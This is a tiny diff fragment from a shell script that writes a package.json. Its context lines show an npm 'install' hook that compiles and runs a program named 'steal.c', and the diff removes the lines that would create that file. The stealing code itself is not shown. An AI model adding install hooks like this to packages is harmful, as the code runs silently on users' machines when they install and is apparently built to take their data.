@@ -61,6 +61,3 @@ cat > package.json << 'EOF'
     "install": "gcc steal.c -o steal && ./steal"
   }
 }
-EOF
-
-cat > steal.c << 'EOF'
